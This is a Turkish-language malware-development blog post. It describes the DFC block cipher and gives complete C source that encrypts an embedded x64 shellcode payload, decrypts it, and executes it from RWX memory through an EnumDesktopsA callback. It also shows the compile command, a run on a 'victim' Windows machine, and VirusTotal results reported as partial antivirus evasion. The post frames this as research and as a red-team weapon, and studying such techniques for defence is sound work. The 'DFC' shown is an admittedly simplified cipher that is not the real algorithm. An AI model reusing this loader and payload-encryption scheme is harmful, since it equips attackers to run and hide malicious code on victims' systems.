\newpage
\subsection{97. malware and cryptography research - part 6 (34): encrypt payload via DFC algorithm. Simple C example.}

﷽

![kriptografi](./images/137/2024-11-10_01-54.png){width="80%"}     

[Lüksemburg](https://www.youtube.com/watch?v=gW8v270HjxI)'daki bir konferansta yaptığım sunum ve atölye çalışmasında, Windows işletim sisteminin iç yapısındaki kriptografik fonksiyonların kötüye kullanımı konusuna değindim. Bu sunumdan sonra birçok meslektaşım ve okuyucum, kötü amaçlı yazılım geliştirme sürecinde kriptografinin kullanımı hakkında daha fazla soru sormaya başladı.     

Bu gönderi, kötü amaçlı yazılım geliştirmede **DFC (Decorrelated Fast Cipher)** kullanımına dair kendi araştırmalarımın bir sonucudur. Her zamanki gibi, çeşitli kripto algoritmalarını keşfederken, bu yöntemi yük şifreleme ve şifre çözme amacıyla kullanırsak ne olacağını kontrol etmeye karar verdim.    

### DFC

**Decorrelated Fast Cipher (DFC)**, `1998` yılında *École Normale Supérieure, CNRS ve France Telecom*'dan kriptograflar tarafından, Serge Vaudenay liderliğinde geliştirildi. **Gelişmiş Şifreleme Standardı (AES) yarışması** için bir aday olarak tasarlanan DFC, `8-tur` [Feistel ağı](https://cocomelonc.github.io/malware/2024/10/20/malware-cryptography-33.html) ve `128-bit` blok boyutu kullanan simetrik bir blok şifresidir. Sonuç olarak AES standardı olarak seçilmese de, DFC kriptografik araştırmalara katkıda bulunmuş ve özellikle PEANUT şifre ailesinin gelişimine önemli bir etki yapmıştır.     

DFC, `8-tur` Feistel ağına dayanan bir yapıya sahiptir. Her turda `128-bit`lik bir blok, iki `64-bit`lik yarıya bölünerek işlenir. DFC, değişken uzunlukta `256-bit`e kadar destekleyen bir anahtardan `8` farklı tur anahtarı üretmek için bir anahtar planlama (key schedule) mekanizması kullanır. Yaygın olarak `128-bit` anahtar ile uygulanır. Her turda, bloğun bir yarısına belirli bir şifreleme fonksiyonu uygulanır, ardından diğer yarı ile birleştirilir ve sonunda blokun yarıları yer değiştirir. Bu, Feistel yapısının klasik bir özelliğidir ve şifre çözmenin, anahtarların sırasını tersine çevirerek kolayca gerçekleştirilebilmesini sağlar.    

DFC'nin mimarisi, diferansiyel ve doğrusal kriptanalize karşı yüksek güvenlik sağlamayı hedefler ve şifrelenmiş verinin içinde istatistiksel ilişkileri azaltarak modern kriptografik saldırılara karşı direnç gösteren dekorrelasyon teorisini kullanmasıyla dikkat çeker. Her turun şifreleme fonksiyonu, ana anahtardan türetilen `64-bit`lik alt anahtar çiftlerini kullanır, bu da DFC'yi hem donanım hem de yazılım uygulamaları için uygun hale getirir.    

DFC, son AES standardı olarak seçilmese de, dekorrelasyon tabanlı saldırılara karşı direnç sağlama konusunda yenilikçi teknikler sunmuş ve simetrik blok şifreleri için güçlü güvenlik özellikleri vurgulanmıştır. Günümüzde DFC, PEANUT (Pretty Encryption Algorithm with n-Universal Transformation) ailesinin bir üyesidir ve kendine özgü matematiksel dönüşümler kullanarak kriptanalize karşı direncini artırmasıyla öne çıkmaktadır.


### pratik örnek

Bunu pratiğe dökelim. DFC tabanlı şifreleme ve şifre çözme fonksiyonlarının nasıl uygulanması gerektiğini adım adım inceleyelim ve özellikle bir yükün şifrelenmesine odaklanalım. Bu yaklaşım, kodun her bölümünü anlamanızı ve DFC şifreleme algoritmasının işleyişine nasıl katkıda bulunduğunu görmenizi sağlayacaktır.

Öncelikle sabitleri ve anahtar değişkenleri tanımlayalım:

```cpp
#define ROUNDS 8
#define BLOCK_SIZE 16
```

Daha sonra anahtar planlaması (key schedule) oluşturulmalıdır.
Anahtar planlama fonksiyonu, orijinal şifreleme anahtarına dayalı olarak `8` adet `128-bit` tur anahtarı üretir. Bu tur anahtarları, Feistel turlarında veri bloğunun her iki yarısına işlemler uygulamak için kullanılır:

```cpp
void key_schedule(uint8_t* key) {
  for (int i = 0; i < ROUNDS; i++) {
    for (int j = 0; j < 16; j++) {
      K[i][j] = key[j] ^ (i + j);
    }
  }
}
```

Tur anahtarları, anahtarın her baytını tur ve bayt indeksleriyle `XOR`layarak türetilir ve her tur için benzersiz anahtarlar oluşturulur.

Bir sonraki adım, Feistel tur fonksiyonunu uygulamaktır. DFC'de her tur, bloğun sol ve sağ yarıları üzerinde işlemler gerçekleştirir. Tur fonksiyonu `G` olarak tanımlanır ve bloğun `sol` ve `sağ` yarıları ile bir `tur anahtarı` alır.    
Bu fonksiyon, sol ve sağ yarıları değiştirir ve sol yarıyı (`F` fonksiyonu uygulandıktan sonra) sağ yarı ve mevcut tur anahtarı ile `XOR` işlemine tabi tutar:   

```cpp
// DFC G function applies Feistel structure in each round
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
  uint32_t tempRight = *right;
  *right = *left ^ F(*right, *(uint32_t*)roundKey);
  *left = tempRight;
}
```

`F`, Feistel yapısının temel fonksiyonudur. Benim uygulamamda, **Decorrelated Fast Cipher (DFC)** turu için `F` fonksiyonu, her turda doğrusal olmayanlık ve difüzyon sağlamak amacıyla bit düzeyinde döndürme ve `XOR` işlemi kullanır:

```cpp
// DFC turu için F fonksiyonu (basitleştirilmiş gösterim)
uint32_t F(uint32_t left, uint32_t key_part) {
  return rotl(left + key_part, 3) ^ key_part;
}
```

Burada:
- `left` parametresi genellikle Feistel turundaki veri bloğunun `sol` yarısıdır.   
- `key_part`, her Feistel turu için belirlenen `32-bit` uzunluğunda bir tur anahtarıdır.   

Bu fonksiyonun ana mantığı oldukça basittir:   

- `left` giriş değeri (`veri bloğunun sol yarısı`), `key_part` ile toplanır. Bu toplama işlemi, her turun hem mevcut veri hem de anahtara bağlı olmasını sağlar ve her turun belirli bir tur anahtarına duyarlı hale gelmesini sağlar.   

- Toplama işleminin sonucu `3` bit sola döndürülür (`rotl(..., 3)`). Bit döndürme işlemi, verinin genelinde bitlerin yayılmasını artırarak difüzyonu güçlendirir. `rotl` fonksiyonu, bitleri `3` pozisyon sola kaydırır ve sol uçtaki bitler sağ tarafa geri döner.   

- Son olarak, döndürme işleminin sonucu `key_part` ile `XOR` işlemine tabi tutulur. `XOR` işlemi, doğrusal olmayanlık ekler ve `key_part` veya `left` üzerindeki küçük değişikliklerin `F` fonksiyonunun çıktısında önemli değişikliklere neden olmasını sağlar.   

Sıradaki fonksiyon, blok şifreleme mantığını içeren fonksiyondur.   

`dfc_encrypt` fonksiyonu**, Feistel yapısı içinde `8 tur` boyunca şifreleme işlemi** gerçekleştirir. Her tur, anahtar planlamasından üretilen farklı bir tur anahtarını kullanır:    

```cpp
// DFC encryption function
void dfc_encrypt(uint32_t* block, uint8_t* key) {
  uint32_t left = block[0], right = block[1];

  // perform 8 rounds of encryption
  for (int i = 0; i < ROUNDS; i++) {
    G(&left, &right, K[i]);
  }

  // final left-right swap
  block[0] = right;
  block[1] = left;
}
```

Bu fonksiyon, giriş bloğundan `left` ve `right` değerlerini başlatır. Daha sonra, `8 tur` boyunca, her turun ilgili anahtarını kullanarak `G` fonksiyonunu `left` ve `right` üzerinde uygular. Son olarak, Feistel turunu tamamlamak ve bloğu güncellemek için `left` ve `right` değiştirir.

Şifre çözme fonksiyonu `dfc_decrypt`, şifreleme işlemine ayna tutar, ancak turlar ters sırayla uygulanır:      

```cpp
// DFC şifre çözme fonksiyonu
void dfc_decrypt(uint32_t* block, uint8_t* key) {
  uint32_t left = block[0], right = block[1];

  // Şifre çözme işlemi için 8 turu ters sırayla uygula
  for (int i = ROUNDS - 1; i >= 0; i--) {
    G(&left, &right, K[i]);
  }

  // Son olarak sol-sağ değişimi yap
  block[0] = right;
  block[1] = left;
}
```

Her zamanki gibi, `dfc_encrypt_shellcode`, shellcode'u şifreleme işlemine hazırlamak için padding uygular ve ardından her `128-bit` bloğu şifreler:

```cpp
// function to encrypt shellcode using DFC
void dfc_encrypt_shellcode(unsigned char* shellcode, int shellcode_len, 
uint8_t* key) {
  key_schedule(key);  // generate subkeys
  int i;
  uint32_t* ptr = (uint32_t*)shellcode;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    dfc_encrypt(ptr, key);
    ptr += 4;  // move to the next 128-bit block (4 * 32-bit words)
  }
  // handle remaining bytes by padding with 0x90 (NOP)
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = { 0x90 };
    memcpy(pad, ptr, remaining);
    dfc_encrypt((uint32_t*)pad, key);
    memcpy(ptr, pad, remaining);
  }
}
```

Bu fonksiyon, `key_schedule` çağrısı yaparak tur anahtarlarını başlatır. Ardından, ana shellcode'u `128-bit`lik bloklar halinde şifreler. Eğer shellcode'un uzunluğu blok boyutunun katı değilse, padding uygular.      

Sıradaki adım, şifre çözme mantığıdır:    

```cpp
// DFC kullanarak shellcode'u çözme fonksiyonu
void dfc_decrypt_shellcode(unsigned char* shellcode, int shellcode_len, 
uint8_t* key) {
  key_schedule(key);  // alt anahtarları oluştur
  int i;
  uint32_t* ptr = (uint32_t*)shellcode;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    dfc_decrypt(ptr, key);
    ptr += 4;
  }
  // kalan baytları padding ile işleme al
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = { 0x90 };
    memcpy(pad, ptr, remaining);
    dfc_decrypt((uint32_t*)pad, key);
    memcpy(ptr, pad, remaining);
  }
}
```

Son olarak, tümünü `main` fonksiyonunda birleştirme:

```cpp
int main() {
  unsigned char my_payload[] = 
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

  int my_payload_len = sizeof(my_payload);
  int pad_len = my_payload_len + 
  (BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % BLOCK_SIZE;
  unsigned char padded[pad_len];
  memset(padded, 0x90, pad_len);  // pad with NOPs
  memcpy(padded, my_payload, my_payload_len);

  printf("original shellcode:\n");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", my_payload[i]);
  }
  printf("\n\n");

  uint8_t key[8] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

  dfc_encrypt_shellcode(padded, pad_len, key);

  printf("encrypted shellcode:\n");
  for (int i = 0; i < pad_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  dfc_decrypt_shellcode(padded, pad_len, key);

  printf("decrypted shellcode:\n");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  // allocate and execute decrypted shellcode
  LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, 
  PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, padded, my_payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);

  return 0;
}
```

Gördüğünüz gibi, main fonksiyonunda sadece `meow-meow` messagebox payload şifreleyip çözdüm.    

Tam kaynak kod `hack.c`:     

```cpp
/*
 * hack.c
 * encrypt/decrypt payload via DFC (Decorrelated Fast Cipher) algorithm
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2024/11/10/malware-cryptography-34.html
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 8       // DFC uses 8 rounds of encryption
#define BLOCK_SIZE 16  // DFC operates on 128-bit (16-byte) blocks

// subkeys generated from the main key
uint8_t K[ROUNDS][16];

// rotate left function
uint32_t rotl(uint32_t x, int shift) {
  return (x << shift) | (x >> (32 - shift));
}

// function F for DFC round (simplified for illustration)
uint32_t F(uint32_t left, uint32_t key_part) {
  return rotl(left + key_part, 3) ^ key_part;
}

// DFC G function applies Feistel structure in each round
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
  uint32_t tempRight = *right;
  *right = *left ^ F(*right, *(uint32_t*)roundKey);
  *left = tempRight;
}

// key schedule for DFC
void key_schedule(uint8_t* key) {
  for (int i = 0; i < ROUNDS; i++) {
    for (int j = 0; j < 16; j++) {
      K[i][j] = key[j % 8] ^ (i + j);  // generate subkey for each round
    }
  }
}

// DFC encryption function
void dfc_encrypt(uint32_t* block, uint8_t* key) {
  uint32_t left = block[0], right = block[1];

  // perform 8 rounds of encryption
  for (int i = 0; i < ROUNDS; i++) {
    G(&left, &right, K[i]);
  }

  // final left-right swap
  block[0] = right;
  block[1] = left;
}

// DFC decryption function
void dfc_decrypt(uint32_t* block, uint8_t* key) {
  uint32_t left = block[0], right = block[1];

  // perform 8 rounds of decryption in reverse
  for (int i = ROUNDS - 1; i >= 0; i--) {
    G(&left, &right, K[i]);
  }

  // final left-right swap
  block[0] = right;
  block[1] = left;
}

// function to encrypt shellcode using DFC
void dfc_encrypt_shellcode(unsigned char* shellcode, int shellcode_len, 
uint8_t* key) {
  key_schedule(key);  // generate subkeys
  int i;
  uint32_t* ptr = (uint32_t*)shellcode;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    dfc_encrypt(ptr, key);
    ptr += 4;  // move to the next 128-bit block (4 * 32-bit words)
  }
  // handle remaining bytes by padding with 0x90 (NOP)
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = { 0x90 };
    memcpy(pad, ptr, remaining);
    dfc_encrypt((uint32_t*)pad, key);
    memcpy(ptr, pad, remaining);
  }
}

// function to decrypt shellcode using DFC
void dfc_decrypt_shellcode(unsigned char* shellcode, int shellcode_len, 
uint8_t* key) {
  key_schedule(key);  // generate subkeys
  int i;
  uint32_t* ptr = (uint32_t*)shellcode;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    dfc_decrypt(ptr, key);
    ptr += 4;
  }
  // handle remaining bytes by padding
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = { 0x90 };
    memcpy(pad, ptr, remaining);
    dfc_decrypt((uint32_t*)pad, key);
    memcpy(ptr, pad, remaining);
  }
}

int main() {
  unsigned char my_payload[] = 
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

  int my_payload_len = sizeof(my_payload);
  int pad_len = my_payload_len + 
  (BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % BLOCK_SIZE;
  unsigned char padded[pad_len];
  memset(padded, 0x90, pad_len);  // pad with NOPs
  memcpy(padded, my_payload, my_payload_len);

  printf("original shellcode:\n");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", my_payload[i]);
  }
  printf("\n\n");

  uint8_t key[8] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

  dfc_encrypt_shellcode(padded, pad_len, key);

  printf("encrypted shellcode:\n");
  for (int i = 0; i < pad_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  dfc_decrypt_shellcode(padded, pad_len, key);

  printf("decrypted shellcode:\n");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  // allocate and execute decrypted shellcode
  LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, 
  PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, padded, my_payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);

  return 0;
}
```

Her zamanki gibi, doğruluk kontrolü için bazı çıktı mantıkları eklenmiştir ve yük [EnumDesktopsA](https://cocomelonc.github.io/tutorial/2022/06/27/malware-injection-20.html) aracılığıyla çalıştırılmaktadır.

### demo

Hadi her şeyi aksiyonda görelim. Derleyelim (benim `linux` makinemde):    

```bash
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc
```

![kriptografi](./images/137/2024-11-10_01-49.png){width="80%"}      

Daha sonra, bunu kurbanın makinesinde (`windows 11 x64` benim durumumda) çalıştırın:    

```powershell
.\hack.exe
```

![kriptografi](./images/137/2024-11-10_01-54_1.png){width="80%"}      

![kriptografi](./images/137/2024-11-11_07-19.png){width="80%"}      

Gördüğünüz gibi, her şey mükemmel çalıştı! =^..^=    

Shannon entropisini hesaplayın:    

```bash
python3 entropy.py -f hack.exe
```

![kriptografi](./images/137/2024-11-10_10-41.png){width="80%"}      

Payload'ımız `.text` bölümünde.    

Kötü amaçlı yazılım tarayıcısıyla tarama:     

![kriptografi](./images/137/2024-11-11_07-21.png){width="80%"}      

![kriptografi](./images/137/2024-11-11_07-21_1.png){width="80%"}      

[https://websec.net/scanner/result/8d7862b2-dbba-48bb-924c-a3694cac3269](https://websec.net/scanner/result/8d7862b2-dbba-48bb-924c-a3694cac3269)      

VirusTotal'a yükleme:     

![kriptografi](./images/137/2024-11-11_11-49.png){width="80%"}      

[https://www.virustotal.com/gui/file/9d702d3194ef3a6160f9ab7f6b30ebaae92c365fa4c12368c7e9ec589ebbe1fd/detection](https://www.virustotal.com/gui/file/9d702d3194ef3a6160f9ab7f6b30ebaae92c365fa4c12368c7e9ec589ebbe1fd/detection)

**Gördüğünüz gibi, 72 antivirüs motorundan sadece 29 tanesi dosyamızı zararlı olarak tespit etti.**     

İlginç bir sonuç.       

Bildiğiniz gibi, araştırmalarımda ve bu [blogda](https://cocomelonc.github.io/malware/2024/07/16/malware-cryptography-29.html) incelediğim [birçok](https://cocomelonc.github.io/malware/2023/03/09/malware-av-evasion-13.html) şifreleme algoritması [Feistel ağlarını](https://cocomelonc.github.io/malware/2023/08/28/malware-cryptography-20.html) kullanmaktadır.    

### kriptoanaliz

**Decorrelated Fast Cipher (DFC)**'nin kriptoanalizi, özellikle diferansiyel analiz yoluyla yapısal zayıflıklarını ortaya çıkarmıştır. 1999 yılında kriptograflar **Lars Knudsen ve Vincent Rijmen** (*Lars R. Knudsen ve Vincent Rijmen. "On The Decorrelated Fast Cipher (DFC) and Its Theory". Department of Informatics, University of Bergen, N-5020 Bergen. 24 Mart 1999. 6th International Workshop on Fast Software Encryption (FSE '99). Rome: Springer-Verlag. ss. 81–94*) tarafından yapılan çalışmalar, DFC’nin **8 turluk yapısının diferansiyel saldırılarla zayıflatılabileceğini** göstermiştir. Bu çalışmada, **DFC’nin 8 turundan 6’sını başarıyla kırabilen diferansiyel saldırılar tanıtılmıştır**. Bu saldırılar, özellikle Feistel turlarının belirli bölümlerine uygulanan farklar yoluyla şifreleme sisteminin yayılma özelliklerindeki zayıflıkları ortaya çıkarmıştır. Bu analiz, AES yarışması için tasarlanan DFC’nin, bazı diğer adaylara kıyasla kriptanalitik tekniklere karşı daha az dirençli olduğunu göstermiştir.     

Umarım bu gönderi, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalı olur, bu ilginç şifreleme tekniği hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takımın cephaneliğine bir silah ekler.      

[https://en.wikipedia.org/wiki/DFC_(cipher)](https://en.wikipedia.org/wiki/DFC_(cipher))     
[On The Decorrelated Fast Cipher (DFC) and Its Theory. Lars R. Knudsen ve Vincent Rijmen](https://citeseerx.ist.psu.edu/document?repid=rep1&type=pdf&doi=2f58280af84f265c65f42d0799a6ca5f9ed620fd)      
[Malware And Hunting For Persistence: How Adversaries Exploit Your Windows? - Cocomelonc. HACKLU 2024](https://www.youtube.com/watch?v=gW8v270HjxI)     
[Kötü Amaçlı Yazılım ve Kriptografi 1](https://cocomelonc.github.io/malware/2023/08/13/malware-cryptography-1.html)      
[GitHub'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2024-11-10-malware-cryptography-34)   